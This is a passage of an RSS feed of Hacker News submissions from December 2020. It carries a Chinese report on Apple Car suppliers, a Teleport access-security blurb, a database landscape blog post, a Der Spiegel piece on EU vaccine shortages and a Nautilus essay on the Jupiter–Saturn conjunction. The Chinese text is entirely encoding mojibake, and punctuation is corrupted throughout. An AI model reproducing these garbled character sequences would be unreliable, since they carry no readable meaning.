         <p> è˜‹æœå°é›»å‹•è»Šçš„é€²åº¦å§‹çµ‚ç§˜è€Œä¸å®£ï¼Œå¤–ç•ŒåŸæœ¬é æœŸï¼Œè‡³å°‘åˆ°2023å¹´æ‰æœƒç™¼è¡¨Apple Carã€‚ä¸éï¼Œåœ‹å…§ä¾›æ‡‰éˆå¤§å» è‘£åº§ç›´è¨€ï¼Œå®¢æˆ¶è¦åŠƒApple Caræ˜å¹´9æœˆå°‡ç™¼è¡¨ï¼›å¦å¤–ï¼Œäºé¦¬éœèˆ‡Rivianåˆä½œçš„é›»å‹•è²¨å¡è»Šï¼Œæ˜å¹´8æœˆæ¶å…ˆå•ä¸–ï¼Œé—œéµä¾›æ‡‰éˆä¹Ÿéƒ½æ˜¯å°å» ã€‚</p>
         <!--8-->
         
         <p> é›»å‹•è»Šä¾›æ‡‰éˆå¤§å» é«˜å±¤é€éœ²ï¼Œéš¨è‘—è¨‚å–®å‡ºè²¨ã€çµ„è£å®Œæˆï¼ŒApple Caré¦–æ¬¾åŸå‹è»Šï¼Œå·²æœ‰æ•¸åè¼›ç§˜å¯†åœ¨ç¾åœ‹åŠ å·ä¸Šè·¯æ¸¬è©¦ä¸­ï¼Œé æ–™æ”¾é‡å‡ºè²¨èˆ‡å•†æ©Ÿæ•ˆç›Šæ˜å¹´ç™¼é…µï¼Œ2022å¹´å…¨é¢çˆ†ç™¼ã€‚</p>
         <!--9-->
         
         <p> å¦å¤–ï¼Œé›»å‹•è»Šæ–°å‰µå…¬å¸Rivianï¼Œå»å¹´ç²å¾—äºé¦¬éœ10è¬è¼›é›»å‹•è²¨è»Šè¨‚å–®ï¼Œé›™æ–¹å¯†åˆ‡ç ”ç™¼å®¢è£½åŒ–ç´”é›»å°è²¨è»Šï¼Œç›¸é—œé›¶çµ„ä»¶ä¹Ÿæ˜¯å€šé å°ç£ä¾›æ‡‰éˆï¼Œæ–°è»Šé è¨ˆæ˜å¹´8æœˆåœ¨ç¾åœ‹ä¸Šè·¯ï¼Œ2022å¹´åœ¨å…¨çƒé–‹å§‹æœå‹™ã€‚</p>
         <!--10-->
         
         <p> æ“šäº†è§£ï¼Œé…åˆç‰¹æ–¯æ‹‰å¢ç”¢ï¼Œä»¥åŠã€Œç¾åœ‹é›™Aã€ç­‰æ–°å®¢æˆ¶çš„åŠ å…¥ï¼Œåœ‹å…§ä¸»è¦é›»å‹•è»Šä¾›æ‡‰éˆåŒ…æ‹¬å’Œå¤§ã€è²¿è¯ã€å’Œå‹¤ã€å¯Œç”°ç­‰éƒ½å‡ºç¾ã€Œçˆ†å–®ã€çš„æƒ…å½¢ï¼Œä¸¦ç©æ¥µæ“´å» ã€æ“´ç”¢ã€‚</p>
         <!--11-->
         
         <p> å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸ŠéŠ€é›†åœ˜ä¹ŸåŠ é€Ÿå¸ƒå±€é›»å‹•è»Šé ˜åŸŸï¼Œç›®å‰æ­£èˆ‡æ­æ´²åŠä¸­åœ‹å¤§é™¸é›»å‹•è»Šé›¶ä»¶å¤§å» æ´½è«‡å®¢è£½åŒ–æ™ºæ…§æ»¾ç èºæ¡¿ï¼Œæœ€å¿«æ˜å¹´åº•å‰é–‹å§‹å‡ºè²¨ï¼Œä¸»è¦ç”¨æ–¼é›»å‹•è»Šè½‰å‘èˆ‡å‰è»Šç³»çµ±ã€‚</p>
         <!--12-->
         
         <!--99--> 
        </div></div>]]>
            </description>
            <link>https://j3onakwrnmmdhlpoecrnirxutq-adwhj77lcyoafdy-money-udn-com.translate.goog/money/story/5612/5108191</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495953</guid>
            <pubDate>Mon, 21 Dec 2020 15:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Guide to Secure Infrastructure Access]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495926">thread link</a>) | @gk1
<br/>
December 21, 2020 | https://goteleport.com/resources/white-papers/secure-infrastructure-access/ | <a href="https://web.archive.org/web/*/https://goteleport.com/resources/white-papers/secure-infrastructure-access/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <div>

        
          <p><a href="#form">Download the Full Tech Paper</a></p>

<p>VPNs, firewalls, jump hosts, and other networking components have been fundamental in managing permissioned access to company resources like servers, databases, internal applications, and more. But as cloud computing has matured, these resources have become widely decentralized, and the IT stack compartmentalized and abstracted.</p>

<p>As compute resources change dynamically and communicate via public networks, the current implementation of access controls and policy enforcement is becoming an increasingly inexact science. This whitepaper takes a deep look at these trends, the challenges posed by relying on a purely networking-based security policy, and how to reframe this problem in a realistic light. Distilled into key principles used by engineers from small startups to Fortune 5 companies, these four practices provide a strong framework in reconsidering how companies authenticate and authorize users access to critical infrastructure.</p>

<p>Download the PDF to learn howâ€¦</p>

<p>(1) Basing decisions on identity,</p>

<p>(2) Designing for ease-of-use,</p>

<p>(3) Inherently distrusting all networks, and</p>

<p>(4) Centralizing auditing and monitoring,</p>

<p>â€¦will prepare organizations to secure infrastructure, meet compliance requirements, reduce operational overhead, and get better visibility into user behavior.</p>

<h2 id="form">Download Best Practices for Secure Infrastructure Access</h2>






        


        
        
        

        
      </div>
    </article></div>]]>
            </description>
            <link>https://goteleport.com/resources/white-papers/secure-infrastructure-access/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495926</guid>
            <pubDate>Mon, 21 Dec 2020 15:47:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[End of 2020 rough database landscape]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495668">thread link</a>) | @StianOvrevage
<br/>
December 21, 2020 | https://stian.tech/end-of-2020-rough-database-landscape/ | <a href="https://web.archive.org/web/*/https://stian.tech/end-of-2020-rough-database-landscape/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>There seems to exist a database for every niche, mood or emotion. And they seem to change just as fast.</p>

<p>How do you balance the urge for the new and shiny but without risking too much headache down the road?</p>

<p>This post is an attempt to lay out the rough landscape of databases that you might encounter or consider as of late 2020.</p>

<p>There will be broad generalizations for brevity.</p>

<p>The goal is not to be exhaustive or take all possible precautions. Consider it a starting point for further research and planning.</p>

<!--more-->


<hr>



<p>TLDR: Scroll to the <a href="#Landscape">diagrams</a> or view the <a href="https://stian.tech/images/2020-11-27-end-of-2020-rough-database-landscape/map-complete.png">big picture</a>.</p>



<p><strong>Table of contents</strong></p>

<ul>
  <li><a href="#Background">Background</a>
    <ul>
      <li><a href="#ProjectPhase">Project phase overview</a></li>
    </ul>
  </li>
  <li><a href="#Planning">Planning</a>
    <ul>
      <li><a href="#DatabaseCategories">Database categories</a>
        <ul>
          <li><a href="#SQL">SQL</a></li>
          <li><a href="#NoSQL">NoSQL</a></li>
          <li><a href="#KeyValue">KeyValue</a></li>
          <li><a href="#Timeseries">Timeseries</a></li>
          <li><a href="#Graph">Graph</a></li>
          <li><a href="#OtherNiceThings">Other nice things</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#Landscape">The Landscape</a>
    <ul>
      <li><a href="#SQLMap">SQL</a></li>
      <li><a href="#NoSQLMap">NoSQL</a></li>
      <li><a href="#KeyValueMap">KeyValue</a></li>
      <li><a href="#TimeseriesMap">Timeseries</a></li>
      <li><a href="#GraphMap">Graph</a></li>
    </ul>
  </li>
  <li><a href="#FurtherReading">Further reading</a></li>
  <li><a href="#Conclusion">Conclusion</a></li>
</ul>




<p>IÃ¢â‚¬â„¢m a consultant doing development, DevOps and cloud infrastructure. I also have the occasional side project trying out the Tech Flavor of the Month.</p>


<h2 id="project-phase-overview">Project phase overview</h2>
<p>The typical phases in projects IÃ¢â‚¬â„¢m involved in follow no scientific or trademarked methodology, so YMMV:</p>

<h3 id="starting-out">Starting out</h3>

<p>Get something working as fast as possible. Take all the shortcuts. Use some opinionated framework or platform.</p>

<h3 id="moving-from-development-to-production">Moving from development to production</h3>

<p>People like it, people use it. Move the thing from a single Ã¢â‚¬Å“pet serverÃ¢â‚¬ï¿½ to a more robust cloud environment.</p>

<h3 id="scaling-production">Scaling production</h3>

<p>Bottlenecks and scaling problems start to emerge. Refactor or replace some pieces to remove the bottlenecks.</p>

<h3 id="challenges">Challenges</h3>

<p>Moving between these phases might be a major PITA if the wrong shortcuts were taken in the previous phases.</p>

<p><em>This of course applies to all technology choices and not just databases. But we have to start somewhere, right?</em></p>




<p>When starting out I try to envision all the phases of the project and which directions it may take in the future.</p>

<p>First I want the technology or software I choose to be instantly usable. A Docker image. Great. An <code>apt-get install</code>. Sweet. <code>npm install</code>. Sure, why not. Downloading a tarball. Installing some C dependencies. Setting some flags. Compiling. Symlinking and fixing permissions. Creating some configuration from scratch. Making my own systemd service definitions. Going back and doing every step again because it failed. <em>Mkay, no thanks, IÃ¢â‚¬â„¢m out.</em></p>

<p>At least for me itÃ¢â‚¬â„¢s a plus if itÃ¢â‚¬â„¢s easy to deploy on Kubernetes since I use it for everything already. I always have a cluster or three laying around so I can get a prototype or five up and running quickly before later spending money for cloud hosting.</p>

<p>Does the thing have momentum and a community? If it does it probably has high quality tooling either by the vendor or the open source community (preferably both). It probably also has lots of common questions answered on blogs and StackOverflow and Github issues.</p>

<p><strong>So we managed to build something and the audience likes it.</strong></p>

<p>How easy is it to move it from a production environment into something stable and low-maintenance? For databases that would typically involve using a managed service for hosting it. You do not want to be responsible for operating your own databases. Is it common enough that there are competitors in the marketplace offering it as a managed service? If there is only a single option expect prices to be very steep. Preferably also a managed service by one of the big known cloud platforms. They are usually cheaper. They are less likely to vanish. It might make integration with other systems easier later.</p>

<p><strong>We hit some problems either because of raw scale or some type of usage we did not anticipate in the beginning.</strong></p>

<p>Are there compatible implementations that might solve some common problems? Typically this is because an implementation has to make a decision about itÃ¢â‚¬â„¢s trade-offs. For a database system this is usually around the CAP theorem. A database system (or anything that keeps state) can be:</p>
<ul>
  <li><em>Partition Tolerant</em> - The system still works if a node or the network between nodes fail.</li>
  <li><em>Available</em> - All requests receive a response.</li>
  <li><em>Consistent</em> - The data we read is the current data and not an earlier state.</li>
</ul>

<p>But, you can only have two at the same time. And distributed systems tends to need to be partition tolerant. So we are stuck between consistency and availability.</p>

<p>It might be a good to have an idea of the CAP tradeoffs an implementation has done, and whether there are compatible implementations with different tradeoffs that can be used if later we find out we need to tweak our trade-offs for speed and/or scale.</p>

<blockquote>
  <p><em>More information about CAP theorem <a href="https://en.wikipedia.org/wiki/CAP_theorem">here</a> and <a href="https://towardsdatascience.com/cap-theorem-and-distributed-database-management-systems-5c2be977950e">here</a>. Jepsen have also <a href="https://jepsen.io/analyses">extensively tested</a> many popular databases to see how they break and if they are true to their stated trade-offs.</em></p>
</blockquote>


<h2 id="database-categories">Database categories</h2>

<p>Databases can be roughly sorted into categories. IÃ¢â‚¬â„¢ll keep it simple and use the everyday lingo and not go into details about semantics and definitions (forgive me).</p>

<p>https://www.prisma.io/dataguide/intro/comparing-database-types</p>


<h3 id="sql">SQL</h3>

<p>The oldest category is the relational database, also known as SQL based on the typical interface used to access these databases.</p>

<p>In general these databases have tables with names, a set of pre-defined columns and an arbitrary number of rows. You should have an idea of the data types to be stored in each column (such as text or numbers).</p>

<p>The downside of this is that you have to start with a rough model of the data you want to store and work with. The benefit of this is that later you know something about the model of the data you are working with. Most of the time IÃ¢â‚¬â„¢ll happily do this in the database rather than handle all the potential inconsistencies in all systems that use that database.</p>

<p><em>Main contenders: PostgreSQL. MySQL &amp; MariaDB.</em></p>


<h3 id="nosql">NoSQL</h3>

<p>All the rage the last decade. You put data in you get data out. The data is structured but not necessarily predefined. Think JSON object with values, arrays and lists.</p>

<p>The benefit is productivity when developing. The drawback is that you may pay a price for those shortcuts later if youÃ¢â‚¬â„¢re not careful.</p>

<p><em>Main contender: MongoDB.</em></p>


<h3 id="keyvalue">KeyValue</h3>

<p>Technically a sub-category of NoSQL, and should probably be called caches. But I feel it deserves itÃ¢â‚¬â„¢s own category.</p>

<p>A hyper-fast hyper-simple type of database. It has two columns. A key (ID) and value. The value can be anything, a string, a number, an entire JSON object or a blob containing binary data.</p>

<p>These are typically used in combination with another type of database. Either by storing very commonly used data for even quicker access. Or for certain types of simple data that requires insane speed or throughput and you donÃ¢â‚¬â„¢t want to overload the main database.</p>

<p><em>Main contender: Redis.</em></p>


<h3 id="timeseries">Timeseries</h3>

<p>A lesser known type of database optimized for storing a time series. A time series is a specific data type where the index is typically the time of a measurement. And the measurement is a number.</p>

<p>A time series is almost never changed after the fact. So these databases can be optimized for writing huge amounts of new data and reading and calculating on existing data. At the cost of performance for deleting or updating old data which is sloooow. Since the values are always numbers that tend to change somewhat predictably compression and deduplication can save us massive amounts of storage.</p>

<p><em>Main contenders: Prometheus, InfluxDB, TimescaleDB (plugin for PostgreSQL).</em></p>


<h3 id="graph">Graph</h3>

<p>Graph databases are cool. In a graph database the relationship between objects is a primary feature. Whereas in SQL you need to join an element from one table with another object in another table with some kind of common identifier.</p>

<p>For most simple use cases a regular SQL database will do fine. But when the number of objects stored (rows) and the number of intermediary tables (joins) become large it gets slow, or expensive, or both.</p>

<p>I donÃ¢â‚¬â„¢t have much experience with graph databases but I suspect they are less suited to general tasks and should be reserved for solving specific problems.</p>

<p><em>Main contenders: Neo4j. Redis + RedisGraph.</em></p>

<blockquote>
  <p>PS: Graph databases and GraphQL are completely separate things.</p>
</blockquote>


<h3 id="other-nice-things">Other nice things</h3>

<p>When researching this post IÃ¢â‚¬â„¢ve come across things that look promising but are hard to categorize or fall in their own very niche categories.</p>

<ul>
  <li><a href="https://dgraph.io/">Dgraph</a> - A GraphQL and backend in one.</li>
  <li><a href="https://prestodb.io/">PrestoDB</a> - An SQL interface on top of whatever database or storage you want to connect.</li>
  <li><a href="https://rethinkdb.com/">RethinkDB</a> - A NoSQL database focused on real-time streaming/updating clients.</li>
  <li><a href="https://www.foundationdb.org/">FoundationDB</a> - A transactional key-value store by Apple.</li>
  <li><a href="https://clickhouse.tech/">ClickHouse</a> - An SQL database that stores data (on disk) in columns instead of rows. Makes for blazingly fast analytical and aggregation queries.</li>
  <li><a href="https://aws.amazon.com/qldb/">Amazon Quantum Ledger Database</a> - A managed distributed ledger database (aka blockchain).</li>
  <li><a href="https://www.enterprisedb.com/products/edb-postgres-advanced-server-secure-ha-oracle-compatible">EDB Postgres Advanced Server</a> - An Oracle compatible PostgreSQL variant.</li>
</ul>




<p><em>How to use these maps:</em></p>

<p>Version compatibility are in parenthesis. I have not mapped every version and how much breaking they are compared to previous versions but included some notes where I know there might be issues.</p>

<p><em>API/Protocol/Interface</em> - This is decided by the framework, tool or driver you want to use. Sometimes it might be easier to choose the framework first and then a fitting database protocol. Or you might be lucky to choose the database features you need first and then select frameworks, tools and drivers that support it.</p>

<blockquote>
  <p>I think interfaces are really important when creating and choosing technology. I had a <a href="https://speakerdeck.com/stianovrevage/avoiding-lock-in-without-avoiding-managed-services">presentation</a> about it a while ago and I think itÃ¢â‚¬â„¢s still relevant.</p>
</blockquote>

<p><em>Engine</em> - Database implementations that are independent but try to be compatible. If there are alternatives to the Ã¢â‚¬Å“originalÃ¢â‚¬ï¿½ implementation they might have done different tradeoffs with regards to the CAP theorem or solve other specific problems.</p>

<p><em>Big three managed</em> - Available managed services by the big three clouds, Amazon (AWS), Google (GCP) or Microsoft (Azure). Having an option to host in the big three is most likely the cheapest method as well as having a variety â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stian.tech/end-of-2020-rough-database-landscape/">https://stian.tech/end-of-2020-rough-database-landscape/</a></em></p>]]>
            </description>
            <link>https://stian.tech/end-of-2020-rough-database-landscape/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495668</guid>
            <pubDate>Mon, 21 Dec 2020 15:17:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Corona: Germany and Europe Could Fall Short on Vaccine Supplies â€“ DER Spiegel]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495657">thread link</a>) | @amadeuspagel
<br/>
December 21, 2020 | https://www.spiegel.de/international/europe/the-planning-disaster-germany-and-europe-could-fall-short-on-vaccine-supplies-a-3db4702d-ae23-4e85-85b7-20145a898abd | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/europe/the-planning-disaster-germany-and-europe-could-fall-short-on-vaccine-supplies-a-3db4702d-ae23-4e85-85b7-20145a898abd">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-article-el="body">
<section data-app-hidden="">


</section>
<section>
<div>
<figure data-component="Image" data-zoom-id="11771a7d-f3c3-4332-a3e0-9a4c299de79b" data-settings="{&quot;id&quot;:&quot;43082d97-6d92-4000-8257-10d0b6dbad2d&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;11771a7d-f3c3-4332-a3e0-9a4c299de79b&quot;}">
<p><span>
<span data-image-el="aspect">
<span>
<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/43082d97-6d92-4000-8257-10d0b6dbad2d_w948_r1.77_fpx53_fpy52.jpg" srcset="https://cdn.prod.www.spiegel.de/images/43082d97-6d92-4000-8257-10d0b6dbad2d_w520_r1.77_fpx53_fpy52.jpg 520w, https://cdn.prod.www.spiegel.de/images/43082d97-6d92-4000-8257-10d0b6dbad2d_w948_r1.77_fpx53_fpy52.jpg 948w" width="948" height="536" sizes="948px" title="German Health Minister Jens Spahn: Optimism hasn't been matched by reality." alt="German Health Minister Jens Spahn: Optimism hasn't been matched by reality.">
</span>
</span>
</span>

</p>
<figcaption>
<p><strong>German Health Minister Jens Spahn:</strong> Optimism hasn't been matched by reality.</p>
<span>
Foto:â€‚<p>GETTY IMAGES</p>
</span>
</figcaption>
</figure>
</div><div>
<p>Such are images of hope: Nurses getting vaccinated. Pallets of packaged vaccines distributed on special flights. Mayors exulting over "the beginning of the end of the pandemic.â€ A president who is preparing the country for better times.</p>


<div>
<p>These images are from the United States.</p><p>In Germany, on the other hand, you see desolate shopping streets, shuttered restaurants and a government that is preparing its population for long, dark days.</p><p>The contrast is unmistakable. On the one hand, there is the supposedly incompetent Trump administration, which will provide vaccines to 20 million Americans in the next two to three weeks alone. By the end of March, the plan is for around 100 million Americans to have received the two vaccine injections they need.</p><p>On the other hand, there is the supposedly well-prepared Europeans, who continue to have to wait for a vaccine that was developed in Germany. And who still donâ€™t know exactly how much of the vaccine they will be getting in the coming months.</p>
</div>

<p>Initially, Germanyâ€™s health minister has announced, there will probably only be 400,000 vaccine doses for Germany, with another 11 to 13 million to follow by March -- a fraction of the amount the Americans are getting.</p>

<section data-area="contentbox">

</section>
<p>Itâ€™s a politically dangerous situation that has now been recognized by the German government. Since last week, it has been taking hectic countermeasures. The European Medicines Agency (EMA) now wants to approve the vaccine a week earlier than planned, and vaccinations are slated to begin in Europe on Dec. 27. Negotiations are also underway with manufacturers to obtain more doses. On Thursday, German Chancellor Angela Merkel even spoke with BioNTech founders Ã–zlem TÃ¼reci and UÄŸur È˜ahin in a livestream, part of which was broadcast publicly. The message couldnâ€™t be any clearer: Vaccination is now the chancellorâ€™s business.</p>

<div>
<p>That realization has come too late, however. For months, it has been clear that other countries would have more doses of the vaccine, would start vaccinating sooner and, as a result, would be able to take more effective action against the pandemic.</p><p>But in Berlin and at European Union headquarters in Brussels, too little action was taken for too long, and it was often justified with complacent arguments: In Europe, medicines are tested better and more precisely than elsewhere in the world, and vaccines are available in abundance thanks to good planning. Health Minister Jens Spahn announced that the critical mass of around 60 percent of the German population could be vaccinated.</p>
</div>

<div>
<h3>Too Little, Too Late</h3><p>But, so far at least, his optimism hasnâ€™t been matched by reality.</p><p>And the late approval of the active ingredient in the BioNTech and Pfizer vaccine by the European Medicines Agency (EMA) appears to be the least of the problems. The bigger issue is that if the situation remains as it is now, there will not be enough vaccine available to get the pandemic under control in Germany before next autumn. The EU appears to have bought too little, too late and at times from the wrong producers. And it appears that it turned down hundreds of millions of vaccine doses that are now lacking.</p><p>Dramatic consequences are brewing for the German government: Without being able to vaccinate on a broad scale, the country wonâ€™t be able to stop the virus. Which means that the fall and winter of 2021 could be similar to this year, with high infection rates, contact restrictions and lockdowns. The only remedy would be a massive increase in the number of vaccines that are approved for use.</p><p>But Berlin has made an uncompromising commitment to European solidarity on the vaccination issue. And that means itâ€™s not only the influential and economically strong member states that will have access, but also smaller countries like Romania and Slovenia. If Germany were to go out on its own and buy up vaccine doses that are in short supply, it would massively threaten cohesion in a Europe that is already fragile.</p><p>At the same time, though, the German federal government has an obligation to do all it can to protect its people.</p>
</div>

<div>
<p>Scientists estimate that 60 to 70 percent of Germanyâ€™s population would need to be vaccinated in order to stop the virus. That would require 100 to 120 million doses because, with one exception, all the vaccines currently available have to be administered in two doses before they deliver immunity.</p><p>The EU has ordered a total of 1.3 billion doses from six different manufacturers. Germany is entitled to 18.6 percent of those doses in a distribution mechanism calculated according to its share of the EU population. That amounts to around 250 million doses. But the number is misleading.</p><p>Currently, the only deliveries that are certain are those from German-American consortium BioNTech/Pfizer and the American biotech company Moderna.</p><p>BioNTech, whose vaccine is to be approved by the EU on Dec. 21, will be able to supply around 45 million doses to Germany in the first half of the year, according to current estimates. Moderna, whose vaccine is due to be authorized for use in Europe on Jan. 6, could supply around 15 million doses. Together, thatâ€™s a total of 60 million doses, which is far too little.</p><h3>But When?</h3><p>Additional supplies are to come from four other producers with whom the EU has contracts. But it remains highly uncertain when they will be able to deliver. No matter what happens, no significant quantities are expected before the summer.</p><p>The Anglo-Swedish pharmaceutical company AstraZeneca had to interrupt its vaccine trial and delivered disappointing testing data. French company Sanofi has postponed possible approval for its vaccine candidate to the end of 2021. Meanwhile, the vaccine from CureVac, based in TÃ¼bingen, Germany, isnâ€™t expected until this summer. The only company that is close to delivering another vaccine candidate is Johnson &amp; Johnson in the U.S., and it isnâ€™t expected until March.</p>
</div>

<div>
<p>Of course, not all of these developments could have been foreseen. The U.S., for example, believed that Sanofi would be quicker in delivering its vaccine. Still, the procurement of vaccines in Europe has been a bumpy road from the start.</p><p>Germany initiated a small vaccine alliance in the spring together with France, Italy and the Netherlands. In a first step, they reached an agreement with AstraZeneca for 400 million doses. The move was primarily intended as a means of exerting pressure because there wasnâ€™t enough happening in Brussels. "Many countries around the world have already secured vaccines, but Europe hasnâ€™t yet,â€ Health Minister Spahn warned at the time.</p><p>In mid-June, the European Commission subsequently presented an EU vaccine strategy to "ensure fair and equitable access for all across the EU.â€ Sufficient supplies for the member states were to be ensured by providing purchasing guarantees to manufacturers.</p><p>Health care is actually one of the competencies that is reserved for the member states in the EU. But the vaccine supply was meant to serve as a symbol of solidarity in contrast to the U.S., where Donald Trump was propagating his "America Firstâ€ stance and fueling merciless global competition for the coveted vaccines.</p><p>Between August and October, the EU concluded the first of its contracts: with the pharmaceutical giants Sanofi, Johnson &amp; Johnson and AstraZeneca. Even at the time, though, it was conspicuous that the companies with the most promising vaccine candidates were not given firm contracts. BioNTech and Moderna had already obtained promising results from their studies in July and were entering the home stretch.</p><h3>No Comment</h3><p>Behind the scenes, this was the source of anger and irritation within government circles in Berlin. The irritation grew significantly in November, when the companies published data that their vaccine candidates are each up to 95 percent effective.</p><p>The manufacturers have repeatedly made it clear that they intend to distribute the vaccine according to two criteria: population size and when the contract was signed.</p><p>Way back in July, the U.S. secured 600 million doses of the BioNTech vaccine and 500 million doses from Moderna. Japan, Canada, Hong Kong and others signed contracts in the summer and autumn. The EU only reserved doses. It didnâ€™t place concrete orders until mid-November. And even then, it ordered far less than it could have.</p>
</div>
<figure>
<div data-component="Image" data-zoom-id="267f0cf1-087d-4684-9909-82caf5e943c7" data-settings="{&quot;id&quot;:&quot;e3d11ac4-de28-47c9-ae87-3d80262ec5a1&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;267f0cf1-087d-4684-9909-82caf5e943c7&quot;}">
<div>
<div>
<p><span>
<span data-image-el="aspect">
<span>

<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w718_r1.6042128603104213_fpx31.17_fpy50.jpg" srcset="https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w488_r1.6042128603104213_fpx31.17_fpy50.jpg 488w, https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w616_r1.6042128603104213_fpx31.17_fpy50.jpg 616w, https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w718_r1.6042128603104213_fpx31.17_fpy50.jpg 718w" width="718" height="448" sizes="718px" loading="lazy" data-srcset="https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w488_r1.6042128603104213_fpx31.17_fpy50.jpg 488w, https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w616_r1.6042128603104213_fpx31.17_fpy50.jpg 616w, https://cdn.prod.www.spiegel.de/images/e3d11ac4-de28-47c9-ae87-3d80262ec5a1_w718_r1.6042128603104213_fpx31.17_fpy50.jpg 718w" title="A future vaccination center in Husum, the Netherlands: a fraction of what the Americans are getting" alt="A future vaccination center in Husum, the Netherlands: a fraction of what the Americans are getting">
</span>
</span>
</span>
</p><figcaption>
<p><strong>A future vaccination center in Husum, the Netherlands: </strong>a fraction of what the Americans are getting</p>
<span>
Foto:â€‚Shutterstock
</span>
</figcaption>
</div>
</div>
</div>
</figure><div>
<p>The EU only secured 200 million doses from BioNTech, with an option for 100 million more that would be manufactured later. According to sources with knowledge of the negotiations, BioNTech had additional capacity and apparently offered that capacity to the EU: up to 500 million doses in the first round.</p><p>But the European Commission reportedly rejected the offer. European Health Commissioner Stella Kyriakides would not comment on the exact reason. "We do not comment on the progress of negotiations," a commission spokesman said.</p><p>Why were only 300 million doses of a vaccine secured that had already demonstrated 95 percent efficacy in clinical trials at the time? One that had been hailed as a sensation and was already on its way to regulatory approval? German Health Minister Spahn pushed for more to be purchased, but he failed to prevail in the end due to opposition from several EU member countries -- in part, apparently, because the EU had ordered only 300 million doses from the French company Sanofi. "Thatâ€™s why buying more from a German company wasn't in the cards,â€ says one insider familiar with the negotiations. The European Commission has denied that version of events,&nbsp;saying it isnâ€™t true that Paris took massive steps to protect Sanofi.</p>
</div>
<section>

</section>
<div>
<p>However, similar reports have emerged from the negotiations with the U.S. producer Moderna. Studies also showed its product to have efficacy of 95 percent. But the EU only ordered â€¦</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/europe/the-planning-disaster-germany-and-europe-could-fall-short-on-vaccine-supplies-a-3db4702d-ae23-4e85-85b7-20145a898abd">https://www.spiegel.de/international/europe/the-planning-disaster-germany-and-europe-could-fall-short-on-vaccine-supplies-a-3db4702d-ae23-4e85-85b7-20145a898abd</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/europe/the-planning-disaster-germany-and-europe-could-fall-short-on-vaccine-supplies-a-3db4702d-ae23-4e85-85b7-20145a898abd</link>
            <guid isPermaLink="false">hacker-news-small-sites-25495657</guid>
            <pubDate>Mon, 21 Dec 2020 15:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Sight of Jupiter and Saturn Together Is a Beautiful Thing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25495448">thread link</a>) | @CapitalistCartr
<br/>
December 21, 2020 | http://m.nautil.us/blog/the-sight-of-jupiter-and-saturn-together-is-a-beautiful-thing | <a href="https://web.archive.org/web/*/http://m.nautil.us/blog/the-sight-of-jupiter-and-saturn-together-is-a-beautiful-thing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

			<figure data-alt=""><img src="http://static.nautil.us/18044_3ff5042bc9d37fc481ca2b15f46618d7.jpg" width="733" alt=""><figcaption><span><i>A conjunction is a good time to reflect on our cosmic heritage, and on the long shadows cast by the gas giants.</i></span><span>Illustration by SN VFX / Shutterstock</span></figcaption></figure><p><span>T</span>oday, December 21, Jupiter and Saturn will appear extremely close to each other in the sky, less than a tenth of a degree apart, about one fifth the width of the full Moon.<sup>1</sup> â€œConjunctionsâ€ like this happen all the time but, for us, here on Earth, itâ€™s special becauseâ€”though the planets will still be more than a half-billion kilometers apartâ€”from our point of view, the planets could almost touch.<sup>2</sup></p><p>A conjunction is a good time to reflect on our cosmic heritage, and on the long shadows cast by the gas giants. After all, Jupiter and Saturn influenced Earthâ€™s growth and evolution. Evidence suggests there were at least three occasions on which they (Jupiter especially) chose Earthâ€™s evolutionary path, some 4.5 billion years ago, helping to shape the planet we know and love today.</p><p>The wee infant Earth was just sitting there growing<span><br></span>Some rocky things flying by, crashing and glowing.<span><br></span>But far from the Sun, way out in the cold<span><br></span>The giants were stirring. A force to behold!<sup>3</sup></p><p>Planets grow within swirling disks of gas and dust around young stars. We have images of these disks taken with our biggest telescopes, especially the giant radio telescope ALMA. Here is one of ALMAâ€™s classics:</p><figure data-alt=""><img src="http://static.nautil.us/18046_4fea1a6421a72296a12cd7898b93858e.jpg" width="733" alt=""><figcaption><span><i>ALMA image of the planet-forming disk around the nearby star TW Hydrae. The disk as a whole is similar in size to the solar system, and the inner hole in the inset is about the size of Earthâ€™s orbit.</i></span><span>S. Andrews (Harvard-Smithsonian CfA), ALMA (ESO / NAOJ / NRAO)</span></figcaption></figure><p>Jupiter starved the growing Earth. This may sound like a bad thing, but without Jupiter, Earth would probably have become a colossal 